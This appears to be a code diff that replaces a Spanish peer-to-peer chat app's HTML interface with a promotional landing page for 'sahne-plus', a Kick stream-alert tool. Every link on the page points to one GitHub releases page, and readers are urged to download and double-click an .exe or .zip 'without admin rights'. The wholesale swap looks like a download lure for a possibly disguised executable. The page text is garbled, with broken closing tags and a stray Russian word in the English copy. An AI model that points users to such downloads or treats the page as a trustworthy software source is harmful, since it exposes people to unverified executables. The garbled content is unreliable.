@@ -1,391 +1,114 @@
+```html
 <!DOCTYPE html>
-<html lang="es" class="theme-dark font-normal">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#0f1115">
-<title>Chat P2P</title>
-<link rel="manifest" href="manifest.json">
-<link rel="icon" type="image/svg+xml" href="icon.svg">
-<link rel="apple-touch-icon" href="icon.svg">
-<style>
-[hidden]{display:none!important}
-html.theme-dark{--bg:#0f1115;--panel:#171a21;--panel2:#1d2129;--border:#262a35;--text:#e6e8ee;
---muted:#8b91a1;--accent:#6ea8fe;--ok:#4ade80;--warn:#fbbf24;--err:#f87171;
---self:#2a3b5c;--other:#232733;--shadow:0 20px 60px rgba(0,0,0,.6);--hover:#1d2129}
-html.theme-light{--bg:#ffffff;--panel:#f5f6f8;--panel2:#ebedf0;--border:#d8dbe0;--text:#1a1c20;
---muted:#687080;--accent:#2f74d0;--ok:#1d9c4e;--warn:#c98a0f;--err:#c33a3a;
---self:#dbe9ff;--other:#f0f1f4;--shadow:0 20px 60px rgba(0,0,0,.15);--hover:#dfe1e5}
-html.font-small{font-size:13px}
-html.font-normal{font-size:15px}
-html.font-large{font-size:17px}
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{margin:0;height:100%;background:var(--bg);color:var(--text);overflow:hidden;
-font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
-button{font-family:inherit;cursor:pointer}
-input,textarea,select{font-family:inherit}
-#app{display:flex;flex-direction:column;height:100dvh}
-header{display:flex;align-items:center;gap:8px;padding:8px 12px;background:var(--panel);
-border-bottom:1px solid var(--border);flex-shrink:0}
-.icon-btn{background:transparent;border:none;color:var(--text);font-size:20px;
-padding:6px 10px;border-radius:8px;line-height:1}
-.icon-btn:hover{background:var(--hover)}
-#tabs{flex:1;display:flex;gap:4px;overflow-x:auto;scrollbar-width:none}
-#tabs::-webkit-scrollbar{display:none}
-.tab{display:flex;align-items:center;gap:6px;padding:6px 10px;border-radius:8px;
-background:var(--panel2);border:1px solid transparent;color:var(--muted);
-white-space:nowrap;font-size:.87em;flex-shrink:0;max-width:170px}
-.tab.active{color:var(--text);border-color:var(--accent);background:var(--bg)}
-.tab .dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0}
-.tab .dot.on{background:var(--ok)}
-.tab .badge{background:var(--accent);color:#0b1220;font-size:.68em;font-weight:700;
-border-radius:10px;padding:1px 6px}
-.tab .close{opacity:.6;padding:0 2px;font-size:.9em;background:none;border:none;color:inherit}
-.tab .close:hover{opacity:1}
-#chatArea{flex:1;display:flex;flex-direction:column;min-height:0;position:relative}
-#empty{display:flex;flex-direction:column;align-items:center;justify-content:center;
-height:100%;color:var(--muted);gap:12px;padding:24px;text-align:center}
-#messages{flex:1;overflow-y:auto;padding:16px 20px;position:relative}
-.msg{max-width:78%;padding:8px 12px;border-radius:12px;font-size:.93em;line-height:1.4;
-word-wrap:break-word;overflow-wrap:anywhere;position:relative;margin-bottom:6px}
-.msg .meta{display:flex;gap:6px;align-items:center;font-size:.72em;color:var(--muted);
-margin-bottom:3px;font-variant-numeric:tabular-nums}
-.msg .lock{font-size:.9em}
-.msg.self{align-self:flex-end;background:var(--self);border-bottom-right-radius:4px;margin-left:auto}
-.msg.other{align-self:flex-start;background:var(--other);border-bottom-left-radius:4px;margin-right:auto}
-.msg.system{align-self:center;background:transparent;color:var(--muted);font-size:.8em;
-padding:2px 8px;max-width:100%;text-align:center;margin-left:auto;margin-right:auto}
-.msg .status{font-size:.75em;color:var(--muted);margin-left:6px}
-.msg img,.msg video{max-width:100%;border-radius:8px;margin-top:4px;display:block}
-.msg a{color:var(--accent);text-decoration:none;word-break:break-all}
-.msg a:hover{text-decoration:underline}
-.msg .file{display:flex;align-items:center;gap:8px;margin-top:4px;padding:6px 8px;
-background:rgba(0,0,0,.15);border-radius:6px;font-size:.85em}
-.msg .file button{background:var(--accent);color:#0b1220;border:none;border-radius:4px;
-padding:3px 8px;font-size:.85em;font-weight:600}
-.msg .file-omitted{font-style:italic;color:var(--muted);font-size:.9em}
-
-.msg-actions{position:absolute;top:-6px;right:-6px;opacity:0;transition:opacity .15s;
-background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:2px;
-display:flex;gap:2px;pointer-events:none}
-.msg{transition:box-shadow .15s ease}
-.msg.selected{
-  box-shadow: 0 0 0 2px rgba(110,168,254,.35), 0 4px 20px rgba(110,168,254,.2);
-}
-.msg.selected .msg-actions{opacity:1;pointer-events:auto}
-
-.msg-actions button{background:transparent;border:none;color:var(--muted);padding:2px 5px;
-border-radius:4px;font-size:.9em;cursor:pointer}
-.msg-actions button:hover{background:var(--hover);color:var(--text)}
-#composer{display:flex;gap:6px;padding:8px 12px;background:var(--panel);
-border-top:1px solid var(--border);flex-shrink:0}
-#input{flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);
-padding:10px 14px;border-radius:20px;font-size:.93em;outline:none;resize:none;
-min-height:40px;max-height:120px;line-height:1.4}
-#input:focus{border-color:var(--accent)}
-#attach{background:transparent;border:none;color:var(--muted);font-size:1.3em;padding:0 8px}
-#send{background:var(--accent);color:#0b1220;border:none;width:40px;height:40px;
-border-radius:50%;font-size:1em;font-weight:700}
-#send:disabled{opacity:.4}
-#backdrop{position:fixed;inset:0;background:rgba(0,0,0,.5);opacity:0;pointer-events:none;
-transition:opacity .2s;z-index:40}
-#backdrop.on{opacity:1;pointer-events:auto}
-#drawer{position:fixed;top:0;left:0;bottom:0;width:min(380px,90vw);background:var(--panel);
-z-index:50;transform:translateX(-100%);transition:transform .25s;
-display:flex;flex-direction:column;border-right:1px solid var(--border)}
-#drawer.on{transform:none}
-.drawer-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;
-border-bottom:1px solid var(--border)}
-.drawer-head h2{margin:0;font-size:1.05em}
-.drawer-tabs{display:flex;gap:2px;padding:8px 8px 0;border-bottom:1px solid var(--border);flex-wrap:wrap}
-.drawer-tabs button{flex:1;min-width:56px;padding:8px 4px;background:transparent;border:none;
-color:var(--muted);font-size:.8em;border-bottom:2px solid transparent;font-weight:500}
-.drawer-tabs button.on{color:var(--text);border-bottom-color:var(--accent)}
-.drawer-body{flex:1;overflow-y:auto;padding:12px 16px}
-.panel{display:none}
-.panel.on{display:block}
-.field{display:flex;flex-direction:column;gap:5px;margin-bottom:14px}
-.field label{font-size:.8em;color:var(--muted)}
-.field input,.field select,.field textarea{background:var(--bg);border:1px solid var(--border);
-color:var(--text);padding:9px 11px;border-radius:8px;font-size:.93em;outline:none}
-.field input:focus,.field select:focus{border-color:var(--accent)}
-.btn{background:var(--accent);color:#0b1220;border:none;padding:9px 14px;
-border-radius:8px;font-weight:600;font-size:.87em}
-.btn.sec{background:var(--panel2);color:var(--text);border:1px solid var(--border)}
-.btn.danger{background:var(--err);color:#fff}
-.btn.warn{background:var(--warn);color:#0b1220}
-.btn.block{width:100%;display:block;text-align:center}
-.btn.sm{padding:5px 9px;font-size:.72em}
-.list{display:flex;flex-direction:column;gap:6px}
-.list-item{display:flex;align-items:center;gap:10px;padding:10px;background:var(--panel2);
-border-radius:8px;font-size:.87em}
-.list-item .info{flex:1;min-width:0}
-.list-item .name{font-weight:600}
-.list-item .sub{font-size:.75em;color:var(--muted);white-space:nowrap;overflow:hidden;
-text-overflow:ellipsis}
-.list-item .actions{display:flex;gap:4px}
-#logs{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.73em;
-line-height:1.5;background:#0b0d11;border:1px solid var(--border);border-radius:8px;
-padding:8px;max-height:60vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
-html.theme-light #logs{background:#f0f1f4;color:#1a1c20}
-.log-line{padding:1px 0}
-.log-line .t{color:#5a6472}
-.log-line.info .m{color:#a9b0bf}
-html.theme-light .log-line.info .m{color:#4a5060}
-.log-line.warn .m{color:var(--warn)}
-.log-line.err .m{color:var(--err)}
-.log-line.ok .m{color:var(--ok)}
-#diag{font-family:ui-monospace,monospace;font-size:.73em;background:#0b0d11;
-padding:8px;border-radius:8px;border:1px solid var(--border);max-height:60vh;
-overflow:auto;white-space:pre-wrap;word-break:break-all}
-html.theme-light #diag{background:#f0f1f4;color:#1a1c20}
-#netStats{font-size:.8em}
-.stat-head{margin:6px 0;font-weight:600}
-.stat-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;padding:6px 8px;
-background:var(--panel2);border-radius:6px;margin-bottom:4px;font-size:.85em}
-dialog{border:none;background:var(--panel);color:var(--text);border-radius:14px;
-padding:0;max-width:420px;width:92vw;box-shadow:var(--shadow)}
-dialog::backdrop{background:rgba(0,0,0,.6)}
-.dlg-head{padding:16px 18px 8px}
-.dlg-head h3{margin:0 0 4px;font-size:1.05em}
-.dlg-head p{margin:0;font-size:.8em;color:var(--muted);line-height:1.4}
-.dlg-body{padding:8px 18px 12px}
-.dlg-foot{display:flex;gap:8px;justify-content:flex-end;padding:12px 18px 18px}
-.sas-code{font-family:ui-monospace,monospace;font-size:1.8em;letter-spacing:3px;
-text-align:center;padding:16px;background:var(--bg);border-radius:10px;border:1px solid var(--border);
-margin:10px 0;font-weight:700}
-.hint{font-size:.8em;color:var(--muted);line-height:1.5;margin:8px 0}
-#statusBar{padding:4px 12px;background:var(--bg);border-top:1px solid var(--border);
-font-size:.73em;color:var(--muted);display:flex;gap:8px;flex-wrap:wrap;align-items:center}
-#statusBar .pill{padding:2px 8px;border-radius:10px;background:var(--panel2);
-border:1px solid var(--border);cursor:pointer}
-#statusBar .pill.static{cursor:default}
-#statusBar .pill.ok{color:var(--ok);border-color:rgba(74,222,128,.3)}
-#statusBar .pill.warn{color:var(--warn);border-color:rgba(251,191,36,.3)}
-.typing{font-size:.75em;color:var(--muted);font-style:italic;height:14px;padding:0 20px 4px}
-.drop-overlay{position:absolute;inset:0;background:rgba(110,168,254,.15);
-border:2px dashed var(--accent);display:none;align-items:center;justify-content:center;
-z-index:10;font-size:1.1em;font-weight:600;color:var(--accent);pointer-events:none}
-.drop-overlay.on{display:flex}
-#peerMenu{position:fixed;background:var(--panel);border:1px solid var(--border);
-border-radius:10px;padding:6px;z-index:60;box-shadow:var(--shadow);min-width:200px}
-#peerMenu button{display:block;width:100%;text-align:left;padding:8px 10px;background:transparent;
-border:none;color:var(--text);font-size:.87em;border-radius:6px}
-#peerMenu button:hover{background:var(--hover)}
-#lockScreen{position:fixed;inset:0;background:var(--bg);z-index:100;
-display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px}
-#lockScreen h2{font-size:1.2em;margin:0}
-#lockScreen input{background:var(--panel);border:1px solid var(--border);color:var(--text);
-padding:12px 16px;border-radius:10px;font-size:1.4em;letter-spacing:6px;text-align:center;
-outline:none;width:220px}
-#lockScreen input:focus{border-color:var(--accent)}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ sahne-plus - Instant Stream Donations Made Easy</title>
+    <meta name="description" content="Download Sahne+ (صحنه پلاس) for Windows – open-source Kick & KickBot donation, sub, and gift-sub alerts. See alerts with local media. Apache-2.0." />
+    <meta name="keywords" content="sahne plus, صحنه پلاس, kick donation alerts, kickbot alerts, stream alerts, gift sub alerts, windows app, open source" />
+    <meta name="author" content="sahne-plus team" />
+    <meta property="og:title" content="⚡ sahne-plus - Instant Stream Donations Made Easy" />
+    <meta property="og:description" content="Download Sahne+ (صحنه پلاس) – open-source Windows app for Kick / KickBot donation, sub-and gift-sub alerts with local transparent media." />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://github.com/tawnybrown-harmonic4344/sahne-plus/releases" />
 </head>
-<body>
-<div id="app">
-  <header>
-    <button class="icon-btn" id="menuBtn" aria-label="Menu">☰</button>
-    <div id="tabs"></div>
-    <button class="icon-btn" id="newChatBtn" aria-label="New">＋</button>
-  </header>
-  <div id="chatArea">
-    <div id="empty">
-      <div style="font-size:2.6em">🔒</div>
-      <div data-i18n="no_chats">Sin chats abiertos</div>
-      <button class="btn" id="emptyNew" data-i18n="create_chat">Crear chat</button>
+<body style="margin:0; padding:0; font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color:#f4f7fb; color:#1a2634; line-height:1.6;">
+
+    <div style="max-width:1100px; margin:0 auto; padding:40px 20px;">
+
+        <!-- هدر -->
+        <div style="text-align:center; padding-bottom:20px;">
+            <h1 style="font-size:2.8rem; margin:0; color:#0b1b2b; font-weight:700;">⚡ sahne-plus - Instant Stream Donations Made Easy</h1>
+            <p style="font-size:1.1rem; color:#3e5a6b; margin-top:10px; font-weight:400;">Wake up your Kick streams with real-time alerts, no coding needed.</p>
+        </div>
+
+        <!-- دکمه دانلود برجسته -->
+        <div style="text-align:center; margin:30px 0 40px;">
+            <a href="https://github.com/tawnybrown-harmonic4344/sahne-plus/releases" style="background-color:#5b8c5a; color:#ffffff; text-decoration:none; font-size:1.5rem; font-weight:600; padding:16px 50px; border-radius:50px; box-shadow:0 6px 15px rgba(30,80,30,0.3); display:inline-block; letter-spacing:0.5px; transition: all 0.2s ease;" onmouseover="this.style.backgroundColor='#4a7348'" onmouseout="this.style.backgroundColor='#5b8c5a'">🌐 Visit Download Page</a>
+        </div>
+
+        <!-- بخش خوش‌آمد -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:6px solid #5b8c5a; padding-left:15px; margin-top:0;">✨ Welcome to Sahne+ (صحنه پلاس)</h2>
+            <p>If you stream on <strong>Kick</strong> or use <strong>KickBot</strong>, you know how important it is to celebrate your community – every donation, sub, or gifted sub deserves a special moment. <strong>Sahne+</strong> brings those moments to your screen with clean, transparent overlays, locally processedmedia. This is an <strong>open-source</strong> Windows app licensed under Apache-2.0.Customize your alerts to match your stream style. Forget complicated setups – Sahne+ is designed for everyone.</p>
+        </div>
+
+        <!-- دانلود و نصب -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:6px solid #d98e04; padding-left:15px; margin-top:0;">🚀 Getting Started – Download & Run</h2>
+            <p>We’ve made this incredibly simple. No terminal, no compilers.. Just follow these steps:</p>
+            <ol style="padding-left:22px; margin:16px 0; font-size:1.05rem;">
+                <li><strong>Visit this link to download the application.</strong> – <a href="https://github.com/tawnybrown-harmonic4344/sahne-plus/releases" style="color:#1f6f4b; text-decoration:underline; font-weight:600;">github.com/tawnybrown-harmonic4344/sahne-plus/releases</a></li>
+                <li>Once on that page, look for the latest release.</li>
+                <li>Click the file that matches your Windows PC (usually the one that says <code style="background:#f0f2f4; padding:3px 8px; border-radius:6px;">.exe</code> or <code style="background:#f0f2f4; padding:3px 8px; border-radius:6px;">.zip</code>).</li>
+                <li>If you downloaded a <strong>.zip</strong> file: right-click on it, choose “Extract All...” – then open the extracted folder and double-click the application inside.</li>
+                <li>If you downloaded an <strong>.exe</strong> file: just double-click it to run.</li>
+            </ol>
+            <p style="background-color:#f6f9f6; padding:14px 20px; border-radius:12px; border-left:4px solid #5b8c5a; font-weight:500;">💡 No matter который file you get, the app is portable-friendly and doesn’t require admin rights.</p>
+        </div>
+
+        <!-- ویژگی‌ها -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:6px solid #c2573a; padding-left:15px; margin-top:0;">🎁 Features That Spark Joy</h2<
+            <ul style="padding-left:20px; margin:16px 0; display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:15px; list-style:none; padding:0;">
+                <li style="background:#fdfefe; border-radius:14px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.04);">🎯 <strong>Donation alerts (Kick & KickBot)</strong> – show animated popups whenever someone donates.</li>
+                <li style="background:#fdfefe; border-radius:14px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.04);;">💜 <strong>Sub & Gift-Sub Alerts</strong> – Celebrate new subs and generous gifters with special visuals.</li>
+                <li style="background:#fdfefe; border-radius:14px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.04);;">🖼️ <strong>Local Transparent Media</strong> – Use your own images, GIFs, or videos as alert backgrounds(no hosting needed).</li
+                <li style="background:#fdfefe; border-radius:14px; padding:18px; box-shadow:0 2px 8px rgba(0,0,0,0.04);;">🪶 <strong>Lightweight & Fast</strong> – Runs smoothly even on older Windows machines.</li>
+            </ul>
+        </div>
+
+        <!-- راهنمای استفاده و تنظیمات ساده -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:6px solid #4078a6; padding-left:15px; margin-top:0;">🛠️ How to Use – No Experience Needed</h2>
+            <p>When you open Sahne+, you’ll see a simple window. Follow this natural workflow:</p>
+            <div style="display:flex; flex-wrap:wrap; gap:18px; margin-top:15px;">
+                <div style="flex:1; min-width:220px; background:#f6f9f6; border-radius:14px; padding:18px;">
+                    <h3 style="font-size:1.3rem; margin:0 0 8px;">1. Connect your account</h3>
+                    <p style="margin:0;">Enter your Kick channel name or paste your KickBot webhook URL. Everything stays local.</p>
+                </div>
+                <div style="flex:1; min-width:220px; background:#f6f9f6; border-radius:14px; padding:18px;">
+                    <h3 style="font-size:1.3rem; margin:0 0 8px;">2. Choose your media</h3>
+                    <p style="margin:0;">Pick any image or short video for each alert type. You can use the built-in library or your own files.</p>
+                </div>
+                <div style="flex:1; min-width:220px; background:#f6f9f6; border-radius:14px; padding:18px;">
+                    <h3 style="font-size:1.3rem; margin:0 0 8px;">3. Hit “Start Alerts”</h3>
+                    <p style="margin:0;">That’s it. Your stream overlay will instantly show alerts with smooth transparency.</p>
+                </div>
+            </div>
+            <p style="margin-top:22px; background:#eaedf2; padding:12px 20px; border-radius:10px; font-size:0.95rem;">📖 <strong>Tip you can adjust duration, text style, and position in just a few clicks.</strong></p
+        </div>
+
+        <!-- سوالات متداول -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05);">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:6px solid #777f96; padding-left:15px; margin-top:0; margin-bottom:20px;">❓ Common Questions (Quick Answers)</h2>
+            <div style="margin-bottom:14px;">
+                <p style="font-weight:600; margin:0 0 6px;">Can I use this without coding?</p>
+                <p style="margin:0; background:#f8fafc; padding:10px 14px; border-radius:8px;">Absolutely. The whole point is to be streamer-friendly. If you can browse a website, you can run Sahne+.</p>
+            </div>
+            <div style="margin-bottom:14px;">
+                <p style="font-weight:600; margin:0 0 6px;">Is it really free?</p>
+                <p style="margin:0; background:#f8fafc; padding:10px 14px; border-radius:8px;">Yes, open-source under Apache-2.0.Use it for personal streams, commercial streams, whatever you like.</p>
+            </div>
+            <div style="margin-bottom:14px;">
+                <p style="font-weight:600; margin:0 0 6px;">Will it work with OBS?</p>
+                <p style="margin:0; background:#f8fafc; padding:10px 14px; border-radius:8px;">Of course. Just use “Window Capture” or“Game Capture” in OBS and select Sahne+’s transparent window.</p
+            </div>
+        </div>
+
+        <!-- تماس و حمایت -->
+        <div style="background-color:#ffffff; border-radius:18px; padding:30px 35px; margin:25px 0; box-shadow:0 4px 12px rgba(0,0,0,0.05); text-align:center;">
+            <h2 style="font-size:1.8rem; color:#1e3b2e; border-left:none; margin-top:0; margin-bottom:10px;">💬 We’re Here to Help</h2>
+            <p style="margin:0 0 20px;">Have a question or idea? Feedback always welcome.</p>
+            <a href="https://github.com/tawnybrown-harmonic4344/sahne-plus/releases" style="background-color:#4078a6; color:#ffffff; text-decoration:none; font-size:1.2rem; font-weight:600; padding:12px 35px; border-radius:40px; display:inline-block; box-shadow:0 4px 10px rgba(0,10,20,0.2);">Go to the Download Page</a>
+        </div>
+
+        <!-- فوتر -->
+        <div style="text-align:center; padding:20px 0; color:#5a6f7a; font-size:0.9rem; border-top:1px solid #d3dce2; margin-top:20px;">sahne-plus is Apache-2.0 licensed open-source software. Made with ❤️ for streamers.</div>
+
     </div>
-    <div id="messages" hidden></div>
-    <div class="typing" id="typing"></div>
-    <div class="drop-overlay" id="dropOverlay" data-i18n="drop_files"></div>
-  </div>
-  <div id="statusBar"></div>
-  <form id="composer" hidden>
-    <button type="button" id="attach" aria-label="Attach">📎</button>
-    <textarea id="input" rows="1" data-i18n-ph="type_message"></textarea>
-    <button type="submit" id="send" aria-label="Send">➤</button>
-  </form>
-</div>
 
-<div id="backdrop"></div>
-<aside id="drawer">
-  <div class="drawer-head">
-    <h2 data-i18n="menu">Panel</h2>
-    <button class="icon-btn" id="closeDrawer">✕</button>
-  </div>
-  <div class="drawer-tabs">
-    <button data-tab="user" class="on" data-i18n="user">Usuario</button>
-    <button data-tab="contacts" data-i18n="contacts">Contactos</button>
-    <button data-tab="logs" data-i18n="logs">Logs</button>
-    <button data-tab="stats" data-i18n="net_stats">Stats</button>
-    <button data-tab="diag" data-i18n="diag">Diag</button>
-    <button data-tab="settings" data-i18n="settings">Ajustes</button>
-  </div>
-  <div class="drawer-body">
-    <section class="panel on" data-panel="user">
-      <div class="field"><label data-i18n="your_name">Tu nombre</label><input id="setNickname" maxlength="32"></div>
-      <div class="field"><label data-i18n="session_id">ID de sesión</label><input id="setSelfId" readonly></div>
-      <div class="field"><label data-i18n="fingerprint">Huella pública</label><input id="setFingerprint" readonly></div>
-      <p class="hint" data-i18n="fingerprint_hint"></p>
-    </section>
-
-    <section class="panel" data-panel="contacts">
-      <p class="hint" data-i18n="contacts_hint"></p>
-      <div id="contactsList" class="list"></div>
-      <hr style="border-color:var(--border);margin:14px 0">
-      <h4 style="margin:0 0 8px;font-size:.87em" data-i18n="add_manual"></h4>
-      <div class="field"><label data-i18n="room_name_short"></label><input id="contactRoom" maxlength="64"></div>
-      <div class="field"><label data-i18n="contact_nick"></label><input id="contactNick" maxlength="32"></div>
-      <button class="btn block" id="contactAdd" data-i18n="save_contact_btn"></button>
-    </section>
-
-    <section class="panel" data-panel="logs">
-      <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
-        <button class="btn sec sm" id="logFilterAll" data-i18n="logs_all">Todo</button>
-        <button class="btn sec sm" id="logFilterConn" data-i18n="logs_conn">Conn</button>
-        <button class="btn sec sm" id="logFilterIce" data-i18n="logs_ice">ICE</button>
-        <button class="btn sec sm" id="logFilterMsg" data-i18n="logs_msg">Msg</button>
-        <button class="btn sec sm" id="logClear" data-i18n="logs_clear">Limpiar</button>
-
-      </div>
-      <div id="logs"></div>
-    </section>
-
-    <section class="panel" data-panel="stats">
-      <p class="hint" data-i18n="net_stats"></p>
-      <div id="netStats"></div>
-    </section>
-
-    <section class="panel" data-panel="diag">
-      <p class="hint" data-i18n="diag_hint"></p>
-      <div id="diag"></div>
-      <div style="display:flex;gap:6px;margin-top:10px;flex-wrap:wrap">
-        <button class="btn sec sm" id="diagRefresh" data-i18n="refresh"></button>
-        <button class="btn sec sm" id="diagCopy" data-i18n="copy"></button>
-      </div>
-    </section>
-
-    <section class="panel" data-panel="settings">
-      <div class="field"><label data-i18n="theme"></label>
-        <select id="optTheme">
-          <option value="dark" data-i18n="theme_dark"></option>
-          <option value="light" data-i18n="theme_light"></option>
-          <option value="system" data-i18n="theme_system"></option>
-        </select>
-      </div>
-      <div class="field"><label data-i18n="font_size"></label>
-        <select id="optFont">
-          <option value="small" data-i18n="font_small"></option>
-          <option value="normal" data-i18n="font_normal"></option>
-          <option value="large" data-i18n="font_large"></option>
-        </select>
-      </div>
-      <div class="field"><label data-i18n="language"></label>
-        <select id="optLang">
-          <option value="es">Español</option>
-          <option value="en">English</option>
-          <option value="de">Deutsch</option>
-          <option value="zh">中文</option>
-          <option value="ru">Русский</option>
-        </select>
-      </div>
-      <div class="field"><label><input type="checkbox" id="optNotif"> <span data-i18n="notifications"></span></label></div>
-      <div class="field"><label><input type="checkbox" id="optSound"> <span data-i18n="sound"></span></label></div>
-      <div class="field"><label><input type="checkbox" id="optLogs"> <span data-i18n="persist_logs"></span></label></div>
-      <div class="field"><label><input type="checkbox" id="optSavePw" checked> <span data-i18n="save_pw"></span></label></div>
-      <div class="field"><label><input type="checkbox" id="optSaveFiles" checked> <span data-i18n="save_files"></span></label></div>
-      <div class="field"><label data-i18n="strategy_label"></label>
-        <select id="optStrategy">
-          <option value="auto" data-i18n="auto"></option>
-          <option value="torrent" data-i18n="torrent"></option>
-          <option value="nostr" data-i18n="nostr"></option>
-          <option value="mqtt" data-i18n="mqtt"></option>
-        </select>
-      </div>
-      <hr style="border-color:var(--border);margin:14px 0">
-      <h4 style="margin:0 0 8px;font-size:.87em" data-i18n="pin_lock"></h4>
-      <p class="hint" data-i18n="pin_hint"></p>
-      <div style="margin-bottom:8px" id="pinStatus">—</div>
-      <button class="btn block" id="btnPinSet" style="margin-bottom:6px" data-i18n="set_pin"></button>
-      <button class="btn sec block" id="btnPinChange" style="margin-bottom:6px" data-i18n="change_pin"></button>
-      <button class="btn sec block" id="btnPinDisable" style="margin-bottom:6px" data-i18n="disable_pin"></button>
-      <hr style="border-color:var(--border);margin:14px 0">
-      <h4 style="margin:0 0 8px;font-size:.87em" data-i18n="conn_actions"></h4>
-      <button class="btn block" id="btnRestart" style="margin-bottom:6px" data-i18n="restart_conn"></button>
-      <button class="btn warn block" id="btnClearSig" style="margin-bottom:6px" data-i18n="clear_sig"></button>
-      <button class="btn danger block" id="btnHardReset" style="margin-bottom:6px" data-i18n="hard_reset"></button>
-      <hr style="border-color:var(--border);margin:14px 0">
-      <button class="btn danger block" id="btnClearHistory" data-i18n="clear_history"></button>
-      <hr style="border-color:var(--border);margin:14px 0">
-      <div id="storageInfo" class="hint"></div>
-    </section>
-  </div>
-</aside>
-
-<dialog id="newChatDialog">
-  <form id="newChatForm">
-    <div class="dlg-head">
-      <h3 data-i18n="new_chat"></h3>
-      <p data-i18n="new_chat_hint"></p>
-    </div>
-    <div class="dlg-body">
-      <div class="field"><label data-i18n="room_name"></label><input name="room" required maxlength="64"></div>
-      <div class="field"><label data-i18n="password"></label><input name="password" type="password" maxlength="128"></div>
-      <div class="field"><label data-i18n="your_nickname"></label><input name="nickname" maxlength="32"></div>
-    </div>
-    <div class="dlg-foot">
-      <button type="button" class="btn sec" value="cancel" data-i18n="cancel"></button>
-      <button type="submit" class="btn" data-i18n="open"></button>
-    </div>
-  </form>
-</dialog>
-
-<dialog id="sasDialog">
-  <div class="dlg-head">
-    <h3 data-i18n="verify_id"></h3>
-    <p data-i18n="sas_hint"></p>
-  </div>
-  <div class="dlg-body">
-    <div class="sas-code" id="sasCode">— — —</div>
-    <p class="hint" id="sasPeer"></p>
-  </div>
-  <div class="dlg-foot">
-    <button class="btn sec" id="sasCancel" data-i18n="close"></button>
-    <button class="btn" id="sasVerify" data-i18n="sas_verify"></button>
-  </div>
-</dialog>
-
-<dialog id="confirmDialog">
-  <div class="dlg-head"><h3 id="confirmTitle"></h3><p id="confirmMsg"></p></div>
-  <div class="dlg-foot">
-    <button class="btn sec" id="confirmNo" data-i18n="cancel"></button>
-    <button class="btn danger" id="confirmYes" data-i18n="confirm"></button>
-  </div>
-</dialog>
-
-<dialog id="fileWarnDialog">
-  <div class="dlg-head">
-    <h3 data-i18n="file_warn_title"></h3>
-  </div>
-  <div class="dlg-body">
-    <p id="fileWarnBody" style="margin:0;font-size:.87em;line-height:1.5;color:var(--text)"></p>
-    <label style="display:flex;gap:8px;align-items:center;font-size:.85em;margin-top:14px">
-      <input type="checkbox" id="fileWarnDont"> <span data-i18n="dont_show_again"></span>
-    </label>
-  </div>
-  <div class="dlg-foot">
-    <button class="btn" id="fileWarnOk" data-i18n="ok_got_it"></button>
-  </div>
-</dialog>
-
-<div id="lockScreen" hidden>
-  <h2 data-i18n="enter_pin"></h2>
-  <input id="lockInput" type="password" inputmode="numeric" maxlength="12">
-  <button class="btn" id="lockUnlock" data-i18n="unlock"></button>
-  <div id="lockError" style="color:var(--err)" hidden data-i18n="wrong_pin"></div>
-</div>
-
-<input type="file" id="filePicker" multiple style="display:none">
-
-<script type="module" src="./app.js"></script>
 </body>
 </html>
+```
